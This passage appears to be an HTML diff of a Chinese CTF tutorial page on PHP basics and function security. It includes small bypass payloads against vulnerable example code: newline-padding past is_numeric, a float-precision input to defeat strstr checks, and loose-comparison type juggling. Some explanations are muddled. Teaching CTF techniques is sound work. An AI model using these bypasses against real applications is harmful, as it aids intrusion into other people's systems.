+    <span class="md-ellipsis">
+      $$
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extract" class="md-nav__link">
+    <span class="md-ellipsis">
+      extract()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#parse_str" class="md-nav__link">
+    <span class="md-ellipsis">
+      parse_str()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#register_globals" class="md-nav__link">
+    <span class="md-ellipsis">
+      register_globals
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#import_request_variables" class="md-nav__link">
+    <span class="md-ellipsis">
+      import_request_variables
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      伪协议
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="伪协议">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phpfilter" class="md-nav__link">
+    <span class="md-ellipsis">
+      php://filter
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phpinput" class="md-nav__link">
+    <span class="md-ellipsis">
+      php://input
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zip-bzip2-zlib" class="md-nav__link">
+    <span class="md-ellipsis">
+      zip:// &amp; bzip2 &amp; zlib://
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file" class="md-nav__link">
+    <span class="md-ellipsis">
+      file://
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="php">PHP 基础<a class="headerlink" href="#php" title="Permanent link">&para;</a></h1>
+<p>在指导Web方向入门时，我们常说要有一点PHP基础，很对新生会对此疑惑 —— 什么程度的基础。
+因为CTF或者说安全并不是要求你做开发工作，而是审计工作，你不需要完全学习一门语言之后再去处理工作，这没有太大意义。</p>
+<p>本节内容将介绍在CTF比赛中涉及的 PHP 基础语法内容，当然因为篇幅原因，不会太过详细，读者需要结合内容自行在做题的基础上扩展。</p>
+<h3 id="php_1">PHP基础格式<a class="headerlink" href="#php_1" title="Permanent link">&para;</a></h3>
+<p>PHP 脚本以 <strong>&lt;?php</strong> 开始，以 <strong>?&gt;</strong> 结束：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a>    <span class="c1">//执行的相关PHP代码</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="cp">?&gt;</span>
+</code></pre></div></td></tr></table></div>
+<h3 id="_1">变量 赋值 以及 运算<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>PHP 中，变量以 <strong>$</strong> 符号开始，后面跟着变量的名称，并且变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</p>
+<p>要注意的是 PHP 是一门弱类型语言，我们不必向 PHP 声明该变量的数据类型。</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">5</a></span>
+<span class="normal"><a href="#__codelineno-1-6">6</a></span>
+<span class="normal"><a href="#__codelineno-1-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="nv">$x_int</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="nv">$y_int</span> <span class="o">=</span> <span class="mh">0xFFF</span><span class="p">;</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="nv">$float_num</span> <span class="o">=</span> <span class="mf">1.5</span><span class="p">;</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="nv">$txt_string</span> <span class="o">=</span> <span class="s2">&quot;Hello CTF!&quot;</span><span class="p">;</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="nv">$stat_Boolean</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="cp">?&gt;</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>赋值 以及 复合赋值</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">运算符</th>
+<th style="text-align: left;">等同于</th>
+<th style="text-align: left;">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">x = y</td>
+<td style="text-align: left;">x = y</td>
+<td style="text-align: left;">左操作数被设置为右侧表达式的值</td>
+</tr>
+<tr>
+<td style="text-align: left;">x ?= y</td>
+<td style="text-align: left;">x = x ? y</td>
+<td style="text-align: left;">支持 <code>+=</code>, <code>-=</code>, <code>*=</code>, <code>/=</code>, <code>%=</code>,<code>.=</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>逻辑运算</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">运算符</th>
+<th style="text-align: left;">名称</th>
+<th style="text-align: left;">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">x <code>and</code> / <code>&amp;&amp;</code> y</td>
+<td style="text-align: left;">与</td>
+<td style="text-align: left;">如果 x 和 y 都为 true，则返回 true</td>
+</tr>
+<tr>
+<td style="text-align: left;">x <code>or</code> / <code>||</code>  y</td>
+<td style="text-align: left;">或</td>
+<td style="text-align: left;">如果 x 和 y 至少有一个为 true，则返回 true</td>
+</tr>
+<tr>
+<td style="text-align: left;">x xor y</td>
+<td style="text-align: left;">异或</td>
+<td style="text-align: left;">如果 x 和 y 有且仅有一个为 true，则返回 true</td>
+</tr>
+<tr>
+<td style="text-align: left;">! x</td>
+<td style="text-align: left;">非</td>
+<td style="text-align: left;">如果 x 不为 true，则返回 true</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_2">类型比较<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<ul>
+<li>松散比较：使用两个等号 <strong>==</strong> 比较，只比较值，不比较类型。</li>
+<li>严格比较：用三个等号 <strong>===</strong> 比较，除了比较值，也比较类型。</li>
+</ul>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="x">0 == false: bool(true)</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="x">0 === false: bool(false)</span>
+</code></pre></div></td></tr></table></div>
+<h3 id="_3">输出<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>echo</code> - 可以输出一个或多个字符串</li>
+<li><code>print</code> - 只允许输出一个字符串，返回值总为 1</li>
+</ul>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="k">echo</span> <span class="s2">&quot;Hello CTF 很有趣！&quot;</span><span class="p">;</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="cp">?&gt;</span>
+</code></pre></div></td></tr></table></div>
+<h3 id="_4">数组<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p><strong><code>array()</code> 函数用于创建数组</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="nv">$cars</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;Hello&quot;</span><span class="p">,</span><span class="s2">&quot;CTF&quot;</span><span class="p">);</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="k">echo</span> <span class="s2">&quot;I like &quot;</span> <span class="o">.</span> <span class="nv">$cars</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span> <span class="nv">$cars</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;.&quot;</span><span class="p">;</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="cp">?&gt;</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>使用 <code>[]</code> 定义数组</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span>
+<span class="normal"><a href="#__codelineno-5-5">5</a></span>
+<span class="normal"><a href="#__codelineno-5-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="x">$z = [&#39;H&#39;,&#39;e&#39;,&#39;l&#39;, &#39;l&#39;, &#39;o&#39;];</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="x">$z[0] = &#39;H&#39;;</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="x">$z[1] = &#39;r&#39;;</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="x">$z[2] = &#39;l&#39;;</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="x">$z[3] = &#39;l&#39;;</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="x">$z[4] = &#39;o&#39;;</span>
+</code></pre></div></td></tr></table></div>
+<h3 id="_5">魔术常量<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>行如 <strong><code>__FILE__</code></strong> 这样的 <code>__XXX__</code>  预定义常量，被称为魔术常量。</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="x">__FILE__ //返回文件的完整路径和文件名</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="x">highlight_file(__FILE__); //代码高亮的显示当前文件内容</span>
+</code></pre></div></td></tr></table></div>
+<h3 id="_6">表单数据<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p><strong>$_GET</strong> —— 接受 GET 请求传递的参数。</p>
+<p><strong>示例</strong>：<code>example.com/index.php?book=HELLOCTF</code>，你可以使用 <code>$_GET['book']</code> 来获取相应的值。</p>
+<p><strong>$_POST</strong> —— 接受 POST 请求传递的参数。</p>
+<p><strong>示例</strong>：对 <code>example.com/index.php</code> 进行 POST 传参，参数名为 <code>book</code> 内容为 <code>HelloCTF</code>，你可以使用 <code>$_POST['book']</code> 来获取相应的值。</p>
+<p><strong>$_REQUEST</strong> —— 接受 GET 和 POST 以及 Cookie 请求传递的参数。</p>
+<p><strong>示例</strong>：</p>
+<ul>
+<li>如果你通过 URL 传递了一个参数 <code>example.com/index.php?key=value_from_get</code>，你可以通过 <code>$_REQUEST['key']</code> 获取这个值。</li>
+<li>如果你通过 POST 方法提交了一个表单，其中有一个名为 <code>key</code> 的字段且其值为 <code>value_from_post</code>，你也可以通过 <code>$_REQUEST['key']</code> 获取这个值。</li>
+<li>同时，如果你设置了一个名为 <code>key</code> 的 cookie，其值为 <code>value_from_cookie</code>，你还是可以使用 <code>$_REQUEST['key']</code> 来获取这个值。</li>
+</ul>
+<h3 id="_7">内建函数<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p><strong>文件操作函数</strong>：</p>
+<ul>
+<li>
+<p><code>include()</code>: 导入并执行指定的 PHP 文件。例如：<code>include('config.php');</code> 会导入并执行 <code>config.php</code> 文件中的代码。</p>
+</li>
+<li>
+<p><code>require()</code>: 类似于 <code>include()</code>，但如果文件不存在，则会产生致命错误。</p>
+</li>
+<li>
+<p><code>include_once()</code>, <code>require_once()</code>: 与 <code>include</code> 和 <code>require</code> 类似，但只导入文件一次。</p>
+</li>
+<li>
+<p><code>fopen()</code>: 打开一个文件或 URL。例如：<code>$file = fopen("test.txt", "r");</code> 会以只读模式打开 <code>test.txt</code>。</p>
+</li>
+<li>
+<p><code>file_get_contents()</code>: 读取文件的全部内容到一个字符串。例如：<code>$content = file_get_contents("test.txt");</code></p>
+</li>
+<li>
+<p><code>file_put_contents()</code>: 将一个字符串写入文件。例如：<code>file_put_contents("test.txt", "Hello World!");</code></p>
+</li>
+</ul>
+<p><strong>代码执行函数</strong>：</p>
+<ul>
+<li>
+<p><code>eval()</code>: 执行字符串中的 PHP 代码。例如：<code>eval('$x = 5;');</code> 会设置变量 <code>$x</code> 的值为 5。</p>
+</li>
+<li>
+<p><code>assert()</code>: 用于调试，检查一个条件是否为 true。</p>
+</li>
+<li>
+<p><code>system()</code>, <code>shell_exec()</code>, <code>exec()</code>, <code>passthru()</code>: 执行外部程序或系统命令。例如：<code>system("ls");</code> 会执行 <code>ls</code> 命令并显示输出。</p>
+</li>
+</ul>
+<p><strong>反序列化函数</strong>：</p>
+<ul>
+<li><code>unserialize()</code>: 将一个已序列化的字符串转换回 PHP 的值。例如：<code>$array = unserialize($serializedStr);</code> 可以将一个序列化的数组字符串转换为数组。</li>
+</ul>
+<p><strong>数据库操作函数</strong>：</p>
+<ul>
+<li><code>mysql_query()</code>, <code>mysqli_query()</code>: 发送一个 MySQL 查询。例如：<code>$result = mysql_query("SELECT * FROM users");</code></li>
+</ul>
+<p><strong>其他函数</strong>：</p>
+<ul>
+<li>
+<p><code>preg_replace()</code>: 执行正则表达式搜索和替换。例如：<code>$newStr = preg_replace("/apple/i", "orange", $str);</code> 会将 <code>$str</code> 中的 "apple" 替换为 "orange"。</p>
+</li>
+<li>
+<p><code>create_function()</code>: 创建匿名的 lambda 函数。例如：<code>$func = create_function('$x', 'return $x + 1;');</code></p>
+</li>
+</ul>
+<h2 id="php_2">PHP 函数安全<a class="headerlink" href="#php_2" title="Permanent link">&para;</a></h2>
+<p>这里仅针对一些 CTF 常见的函数攻击方法进行分析，如有遗漏，欢迎补充。握手手 🤝</p>
+<h3 id="_8">常见绕过<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<h4 id="is_numeric">is_numeric<a class="headerlink" href="#is_numeric" title="Permanent link">&para;</a></h4>
+<p>作用：检测变量是否是数字或数字字符串。https://www.php.net/manual/en/function.is-numeric.php</p>
+<p><img alt="image-20250131151844734" src="../assets/image-20250131151844734.png" /></p>
+<p>例题</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span>
+<span class="normal"><a href="#__codelineno-7-6">6</a></span>
+<span class="normal"><a href="#__codelineno-7-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="k">if</span> <span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span> <span class="p">{</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4"></a>    <span class="k">exit</span><span class="p">();</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6"></a>    <span class="k">echo</span> <span class="s2">&quot;flag&quot;</span><span class="p">;</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p>想要绕过可以在数字前面或者后面加上<code>%0a %0b %0c %0d %09</code></p>
+<h3 id="php_3">PHP 精度<a class="headerlink" href="#php_3" title="Permanent link">&para;</a></h3>
+<p>首先简单介绍下 PHP 所的双精度格式，IEEE 754 https://zh.wikipedia.org/wiki/IEEE_754</p>
+<p>IEEE 754 表示方法：</p>
+<p>IEEE754 一般分为半精度浮点数、单精度浮点数、<strong>双精度浮点数</strong></p>
+<p>这数为例，在这个长度下会使用 <strong>1位符号</strong>，<strong>11 位指数</strong>，<strong>52 位尾数</strong>。</p>
+<ul>
+<li>符号：0 为正，1 为负</li>
+<li>指数：数据如果以 2 为底的幂，则采用偏移表示法</li>
+<li>尾数：小数点后的数字</li>
+</ul>
+<p><strong>举几个例子：</strong></p>
+<p>IEEE 754 标准在线转换网站：https://tooltt.com/floatconverter/</p>
+<p><strong>0.57</strong> 采用 IEEE 754 标准转换成二进制后如下</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>0 01111111110 0010001111010111000010100011110101110000101000111101
+</code></pre></div></td></tr></table></div>
+<p>将 52 位尾数转换成二进制后：<code>0.56999999999999995</code></p>
+<p>注：转换时 52 位尾数前面要加个 1，以表示该二进制数为负数，然后在前面加上 <strong>0.</strong> 以表示该数为浮点数</p>
+<p>注：基本上所有语言双精度格式都采用 IEEE 754，可以自己转转看，https://www.sojson.com/hexconvert.html</p>
+<p><strong>0.58</strong> 采用 IEEE 754 标准转换成二进制后如下</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a>0 01111111110 0010100011110101110000101000111101011100001010001111
+</code></pre></div></td></tr></table></div>
+<p>转成二进制后：<code>0.57999999999999996</code></p>
+<p>为此，如果将 0.57<em>100 取整（intval），所返回的会是 0.56，0.58</em>100 则为 0.57</p>
+<p>特别的，如果一个数为 0.5899999999999999999，将这个数打印出来后会是 0.59，而 0.59，在十进制中是这样的，但如果在浮点上，所表现的数会为 0.58999999999999997，实验方法如下</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a>echo serialize((float)0.59) . &#39;&lt;br&gt;&#39;;
+<a id="__codelineno-10-2" name="__codelineno-10-2"></a>#返回：d:0.58999999999999997;
+</code></pre></div></td></tr></table></div>
+<p>综上所述，永远不要以为程序会把浮点数的结果精确到最后一位，因为你永远不知道他里边是怎么运算的。</p>
+<p>如果要避免上述的问题，解决方法如下</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a>intval(0.58 * 1000 / 10) 或 intval(0.57 * 1000 / 10)
+</code></pre></div></td></tr></table></div>
+<p>理论：</p>
+<p>而正好，在 PHP 处理浮点数的运算中，采用的就是 IEEE 754 双精度格式，如果对一个数进行取整，所产生的最大相对误差为 <strong>1.11e-16</strong>，通过上面的例子，我们可以再举几个小实例</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-12-10">10</a></span>
+<span class="normal"><a href="#__codelineno-12-11">11</a></span>
+<span class="normal"><a href="#__codelineno-12-12">12</a></span>
+<span class="normal"><a href="#__codelineno-12-13">13</a></span>
+<span class="normal"><a href="#__codelineno-12-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a>echo 1989.9 . &#39;&lt;br&gt;&#39;;
+<a id="__codelineno-12-2" name="__codelineno-12-2"></a>#返回：1989.9
+<a id="__codelineno-12-3" name="__codelineno-12-3"></a>echo 1989.99999999999999 . &#39;&lt;br&gt;&#39;;
+<a id="__codelineno-12-4" name="__codelineno-12-4"></a>#返回：1990
+<a id="__codelineno-12-5" name="__codelineno-12-5"></a>echo 1.99999999999999 . &#39;&lt;br&gt;&#39;; # (小数为15)
+<a id="__codelineno-12-6" name="__codelineno-12-6"></a>#返回：2
+<a id="__codelineno-12-7" name="__codelineno-12-7"></a>echo 0.5799999999999999 . &#39;&lt;br&gt;&#39;;
+<a id="__codelineno-12-8" name="__codelineno-12-8"></a>#返回：0.58
+<a id="__codelineno-12-9" name="__codelineno-12-9"></a>echo 1.9999999999999 . &#39;&lt;br&gt;&#39;; # (小数为13)
+<a id="__codelineno-12-10" name="__codelineno-12-10"></a>#返回：1.9999999999999
+<a id="__codelineno-12-11" name="__codelineno-12-11"></a>echo 1.0000000000001 . &#39;&lt;br&gt;&#39;; # (小数为13)
+<a id="__codelineno-12-12" name="__codelineno-12-12"></a>#返回：1.0000000000001
+<a id="__codelineno-12-13" name="__codelineno-12-13"></a>echo 1.00000000000001 . &#39;&lt;br&gt;&#39;; # (小数为15)
+<a id="__codelineno-12-14" name="__codelineno-12-14"></a>#返回：1
+</code></pre></div></td></tr></table></div>
+<p>如果要一一解释太麻烦了。。这里就通俗点讲，上面的 1989.9 返回 1989.9，而 1989.99999…会返回 1990，这是因为在二进制里边，99999 转成二进制后会出现上述 0.59 的问题，所以 1989.99999…会返回 1990。</p>
+<p>理论就大致这些，这里写个 CTF 例子来参考下。</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span>
+<span class="normal"><a href="#__codelineno-13-3">3</a></span>
+<span class="normal"><a href="#__codelineno-13-4">4</a></span>
+<span class="normal"><a href="#__codelineno-13-5">5</a></span>
+<span class="normal"><a href="#__codelineno-13-6">6</a></span>
+<span class="normal"><a href="#__codelineno-13-7">7</a></span>
+<span class="normal"><a href="#__codelineno-13-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a>$flag = &#39;flag{test}&#39;;
+<a id="__codelineno-13-2" name="__codelineno-13-2"></a>extract($_GET);
+<a id="__codelineno-13-3" name="__codelineno-13-3"></a>if (strstr($num,&#39;1&#39;)) {
+<a id="__codelineno-13-4" name="__codelineno-13-4"></a>    die(&#39;Out!&#39;);
+<a id="__codelineno-13-5" name="__codelineno-13-5"></a>}
+<a id="__codelineno-13-6" name="__codelineno-13-6"></a>if($num==1){
+<a id="__codelineno-13-7" name="__codelineno-13-7"></a>    var_dump($flag);
+<a id="__codelineno-13-8" name="__codelineno-13-8"></a>}
+</code></pre></div></td></tr></table></div>
+<p><strong>注：</strong> strstr(v1, v2)，该函数用于判断 v2 是否为 v1 的字串，如果是则该函数返回 v1 字符串从 v2 第一次出现的位置开始到 v1 结尾的字符串；否则，返回 NULL。</p>
+<p>这个例子大致一个情况就是，如果 num=1 则输出 flag，这里由于使用了 strstr 函数，如果我们输入 1 的话自然会返回 Out!，为此可以使用精度漏洞绕过去</p>
+<p>Payload: <strong>?num=0.999999999999999999999999</strong></p>
+<h3 id="_9">比较和类型转换漏洞<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>先对 PHP 比较运算进行一个简单概括</p>
+<p>PHP 包含 <strong>松散</strong> 和 <strong>严格</strong> 比较</p>
+<p><strong>松散比较</strong>（<code>==</code>）比较值，但不比较类型，<strong>严格比较</strong>（<code>===</code>）即比较值也比较类型</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span>
+<span class="normal"><a href="#__codelineno-14-3">3</a></span>
+<span class="normal"><a href="#__codelineno-14-4">4</a></span>
+<span class="normal"><a href="#__codelineno-14-5">5</a></span>
+<span class="normal"><a href="#__codelineno-14-6">6</a></span>
+<span class="normal"><a href="#__codelineno-14-7">7</a></span>
+<span class="normal"><a href="#__codelineno-14-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1"></a>echo (123 == &quot;123&quot;)?1:0;
+<a id="__codelineno-14-2" name="__codelineno-14-2"></a># 返回：1
+<a id="__codelineno-14-3" name="__codelineno-14-3"></a>echo (123 === &quot;123&quot;)?1:0;
+<a id="__codelineno-14-4" name="__codelineno-14-4"></a># 返回：0
+<a id="__codelineno-14-5" name="__codelineno-14-5"></a>
+<a id="__codelineno-14-6" name="__codelineno-14-6"></a>$id = intval(&quot;12312a&quot;);
+<a id="__codelineno-14-7" name="__codelineno-14-7"></a>var_dump($id);
+<a id="__codelineno-14-8" name="__codelineno-14-8"></a>输出：12312
+</code></pre></div></td></tr></table></div>
+<p><strong>注 4：</strong> 字符串转成数字后会是 0</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a>var_dump(0 == &quot;a&quot;);
+<a id="__codelineno-15-2" name="__codelineno-15-2"></a># 返回： 1（0 &amp; 0 自然为1）
+</code></pre></div></td></tr></table></div>
+<p>在 PHP 中类型转换有一定的缺陷，如果一个 <strong>字符串</strong> 要转成数值类型，首先对字符串进行一个判断，如果字符串包含 <strong>e</strong> 、<strong>.</strong> 、<strong>E</strong> 则会作为 <strong>float</strong> 来取值，否则则为  <strong>int</strong> ，上述例子由于 a 没有包含任何东西，所以被当作 <strong>int</strong> 来处理了，这里要说明的是，如果字符串起始部分为 <strong>数值</strong> ，则采用 <strong>起始的数值</strong> ，否则一律为 <strong>0</strong></p>
+<p>具体查阅：https://www.php.net/manual/zh/language.types.numeric-strings.php</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
+<span class="normal"><a href="#__codelineno-16-2">2</a></span>
+<span class="normal"><a href="#__codelineno-16-3">3</a></span>
+<span class="normal"><a href="#__codelineno-16-4">4</a></span>
+<span class="normal"><a href="#__codelineno-16-5">5</a></span>
+<span class="normal"><a href="#__codelineno-16-6">6</a></span>
+<span class="normal"><a href="#__codelineno-16-7">7</a></span>
